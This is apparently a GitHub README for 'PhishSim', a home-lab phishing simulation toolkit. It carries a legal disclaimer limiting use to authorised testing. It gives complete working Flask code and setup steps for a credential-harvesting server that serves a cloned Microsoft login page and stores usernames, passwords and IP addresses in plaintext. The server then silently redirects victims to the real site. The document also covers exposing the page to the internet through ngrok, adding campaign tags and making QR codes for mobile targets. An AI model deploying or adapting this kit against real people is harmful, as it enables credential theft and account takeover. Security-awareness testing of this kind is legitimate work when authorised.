# Phishing-Simulation-Project-Part-3
# PhishSim — Home Lab Phishing Simulation Framework

> A lightweight phishing awareness and simulation toolkit built on Kali Linux using Python (Flask) and SQLite. Designed for authorised home lab security testing and learning.

---

## ⚠️ Legal Disclaimer

This tool is built for **authorised security awareness testing only**. Only use this against systems and people you have **explicit written consent** from. Unauthorised use is illegal under the Australian Criminal Code Act, UK Computer Misuse Act, and equivalent laws worldwide. The authors take no responsibility for misuse.

---

## Overview

PhishSim is a two-component system:

- **Phishing Server** — serves a cloned login page and captures submitted credentials into a local SQLite database
- **Live Dashboard** — a dark-themed web UI showing real-time capture stats, campaign breakdowns, hourly activity charts, and a full credentials table

Tested and working on **Kali Linux 2024** with **VirtualBox** as the home lab environment.

---

## Features

- Cloned Microsoft login page (customisable to any target)
- SQLite database — zero external dependencies
- Campaign tagging via URL parameter (`?c=campaign-name`)
- Live dashboard with auto-refresh every 15 seconds
- Captures: timestamp, username, password, IP address, user-agent, campaign
- Hourly bar chart and per-campaign hit counter
- Redirect to real site after capture (transparent to target)
- Remote testing via ngrok HTTPS tunnel
- QR code generation for mobile device testing

---

## Lab Architecture

```
┌─────────────────────────────┐        ┌──────────────────────────┐
│        Kali Linux           │        │       Target Device       │
│      192.168.56.103         │        │   Windows PC / Phone      │
│                             │        │                           │
│  ┌─────────────────────┐   │  LAN   │  Browser opens phish page │
│  │  server.py  :80     │◄──┼────────┤  submits fake credentials │
│  │  (phishing server)  │   │        │                           │
│  └─────────────────────┘   │        └──────────────────────────┘
│  ┌─────────────────────┐   │
│  │  dashboard.py :5001 │   │        ┌──────────────────────────┐
│  │  (results viewer)   │   │        │     Remote Testing        │
│  └─────────────────────┘   │        │  Friend on different ISP  │
│  ┌─────────────────────┐   │◄───────┤  taps ngrok HTTPS link    │
│  │  results.db         │   │ ngrok  │                           │
│  │  (SQLite)           │   │ tunnel └──────────────────────────┘
│  └─────────────────────┘   │
└─────────────────────────────┘
```

---

## Project Structure

```
/opt/phish-sim/
├── server.py          # Flask phishing server (port 80)
├── dashboard.py       # Flask dashboard server (port 5001)
├── results.db         # SQLite database (auto-created on first run)
└── templates/
    ├── login.html     # Fake login page (served to targets)
    └── dashboard.html # Live results dashboard UI
```

---

## Requirements

- Kali Linux (tested on 2024.x)
- Python 3
- Flask (`pip3 install flask --break-system-packages`)
- ngrok (for remote/internet testing)

---

## Installation

### 1. Clone or create the project folder

```bash
mkdir -p /opt/phish-sim/templates
cd /opt/phish-sim
```

### 2. Install Flask

```bash
sudo apt update
sudo apt install python3 python3-pip -y
pip3 install flask --break-system-packages
```

### 3. Create server.py

```bash
nano /opt/phish-sim/server.py
```

Paste the following:

```python
from flask import Flask, request, render_template, redirect
import sqlite3, datetime, os

app = Flask(__name__)
DB = os.path.join(os.path.dirname(__file__), "results.db")

@app.after_request
def add_header(r):
    r.headers["ngrok-skip-browser-warning"] = "true"
    return r

def init_db():
    con = sqlite3.connect(DB)
    con.execute("""
        CREATE TABLE IF NOT EXISTS captures (
            id         INTEGER PRIMARY KEY AUTOINCREMENT,
            timestamp  TEXT,
            username   TEXT,
            password   TEXT,
            ip         TEXT,
            user_agent TEXT,
            campaign   TEXT
        )
    """)
    con.commit()
    con.close()

def log_capture(username, password, ip, ua, campaign="default"):
    con = sqlite3.connect(DB)
    con.execute(
        "INSERT INTO captures VALUES (NULL,?,?,?,?,?,?)",
        (datetime.datetime.now().isoformat(), username, password, ip, ua, campaign),
    )
    con.commit()
    con.close()

@app.route("/", methods=["GET"])
def login_page():
    campaign = request.args.get("c", "default")
    return render_template("login.html", campaign=campaign)

@app.route("/submit", methods=["POST"])
def capture():
    username = request.form.get("username", "")
    password = request.form.get("password", "")
    campaign = request.form.get("campaign", "default")
    ip = request.remote_addr
    ua = request.headers.get("User-Agent", "")
    log_capture(username, password, ip, ua, campaign)
    print(f"[+] HIT | {ip} | {username} : {password} | campaign={campaign}")
    return redirect("https://microsoft.com", code=302)

if __name__ == "__main__":
    init_db()
    print("[*] Phishing server → http://0.0.0.0:80")
    app.run(host="0.0.0.0", port=80, debug=False)
```

Save: `Ctrl+O → Enter → Ctrl+X`

### 4. Create dashboard.py

```bash
nano /opt/phish-sim/dashboard.py
```

Paste the following:

```python
from flask import Flask, render_template, jsonify
import sqlite3, os

app = Flask(__name__)
DB = os.path.join(os.path.dirname(__file__), "results.db")

def query(sql, args=()):
    con = sqlite3.connect(DB)
    con.row_factory = sqlite3.Row
    rows = con.execute(sql, args).fetchall()
    con.close()
    return [dict(r) for r in rows]

@app.route("/")
def index():
    return render_template("dashboard.html")

@app.route("/api/stats")
def stats():
    total  = query("SELECT COUNT(*) AS n FROM captures")[0]["n"]
    unique = query("SELECT COUNT(DISTINCT ip) AS n FROM captures")[0]["n"]
    camps  = query("SELECT campaign, COUNT(*) AS n FROM captures GROUP BY campaign")
    recent = query("SELECT * FROM captures ORDER BY id DESC LIMIT 50")
    hourly = query("""
        SELECT strftime('%H:00', timestamp) AS hour, COUNT(*) AS n
        FROM captures GROUP BY hour ORDER BY hour
    """)
    return jsonify({"total":total,"unique_ips":unique,
                    "campaigns":camps,"recent":recent,"hourly":hourly})

@app.route("/api/results")
def results():
    return jsonify(query("SELECT * FROM captures ORDER BY id DESC"))

if __name__ == "__main__":
    print("[*] Dashboard → http://0.0.0.0:5001")
    app.run(host="0.0.0.0", port=5001, debug=False)
```

Save: `Ctrl+O → Enter → Ctrl+X`

### 5. Create templates/login.html

```bash
nano /opt/phish-sim/templates/login.html
```

Paste a cloned login page of your choice. The form must POST to `/submit` and include a hidden `campaign` field:

```html
<form action="/submit" method="POST">
  <input type="hidden" name="campaign" value="{{ campaign }}">
  <input type="text" name="username">
  <input type="password" name="password">
  <button type="submit">Sign in</button>
</form>
```

### 6. Create templates/dashboard.html

The full dark-themed dashboard HTML goes in `/opt/phish-sim/templates/dashboard.html`. It polls `/api/stats` and `/api/results` every 15 seconds and renders live data.

---

## Running the Simulation

### Local Network (same Wi-Fi or LAN)

Open three terminals:

```bash
# Terminal 1 — phishing server
cd /opt/phish-sim && sudo python3 server.py

# Terminal 2 — dashboard
cd /opt/phish-sim && python3 dashboard.py
```

Access from any device on the same network:

| URL | What it is |
|-----|-----------|
| `http://<KALI-IP>` | Phishing page (target sees this) |
| `http://<KALI-IP>:5001` | Live results dashboard |

Find your Kali IP:

```bash
ip addr show | grep "inet " | grep -v 127
```

### Remote Testing via ngrok (different network / internet)

#### Install ngrok

```bash
curl -sSL https://ngrok-agent.s3.amazonaws.com/ngrok.asc \
  | sudo tee /etc/apt/trusted.gpg.d/ngrok.asc >/dev/null \
  && echo "deb https://ngrok-agent.s3.amazonaws.com bookworm main" \
  | sudo tee /etc/apt/sources.list.d/ngrok.list \
  && sudo apt update && sudo apt install ngrok -y
```

#### Add your auth token (from ngrok.com/dashboard)

```bash
ngrok config add-authtoken YOUR_TOKEN_HERE
```

#### Start everything

```bash
# Terminal 1
cd /opt/phish-sim && sudo python3 server.py

# Terminal 2
cd /opt/phish-sim && python3 dashboard.py

# Terminal 3
ngrok http 80
```

ngrok will print a public HTTPS URL like:

```
Forwarding  https://sanctity-humming-overlap.ngrok-free.dev -> http://localhost:80
```

Send that URL to your authorised tester with a campaign tag:

```
https://xxxx.ngrok-free.app/?c=friend-test
```

#### Get a free static domain (same URL every session)

1. Go to `https://dashboard.ngrok.com/cloud-edge/domains`
2. Claim your free static domain
3. Use it with:

```bash
ngrok http 80 --domain=your-name.ngrok-free.app
```

### Campaign Tagging

Append `?c=` to your URL to tag different test groups. Each tag appears as a separate campaign in the dashboard:

```
http://<KALI-IP>/?c=hr-team
http://<KALI-IP>/?c=it-staff
https://xxxx.ngrok-free.app/?c=remote-test
```

### QR Code for Mobile Testing

Generate a QR code directly in terminal for phone scanning:

```bash
sudo apt install qrencode -y
qrencode -t ANSIUTF8 "https://xxxx.ngrok-free.app/?c=mobile-test"
```

---

## Troubleshooting

| Problem | Fix |
|---------|-----|
| Dashboard not loading | Run `ss -tlnp \| grep 5001` — if empty, start `dashboard.py` |
| ERR_NGROK_3200 | `server.py` not running — start it before ngrok |
| Port 80 permission denied | Use `sudo python3 server.py` |
| Can't reach from phone | Add Bridged Adapter in VirtualBox network settings |
| IP changed after reboot | Re-run `ip addr show` to get new IP |
| Firewall blocking | `sudo ufw allow 80/tcp && sudo ufw allow 5001/tcp` |
| ngrok URL changes each session | Claim a free static domain at ngrok dashboard |

---

## Dashboard Screenshot

![PhishSim Dashboard](phishingdashboard.jpg)

*Live dashboard showing 6 captures across 2 campaigns with hourly activity chart*

---

## How it Works

```
Target visits URL
      │
      ▼
server.py serves login.html (cloned page)
      │
Target submits credentials
      │
      ▼
/submit route captures:
  - timestamp
  - username & password
  - IP address
  - user-agent (device info)
  - campaign tag
      │
      ▼
Saved to results.db (SQLite)
      │
      ▼
Target redirected to real site (looks normal)
      │
dashboard.py polls DB every 15s
      │
      ▼
Live results appear in dashboard at :5001
```

---

## Tech Stack

| Component | Technology |
|-----------|-----------|
| Backend | Python 3, Flask |
| Database | SQLite (built into Python) |
| Frontend | Vanilla HTML/CSS/JS |
| Tunnel | ngrok |
| Platform | Kali Linux on VirtualBox |

---

## Author - Swayam Patel

Built as a home lab security awareness project. For educational and authorised testing purposes only.
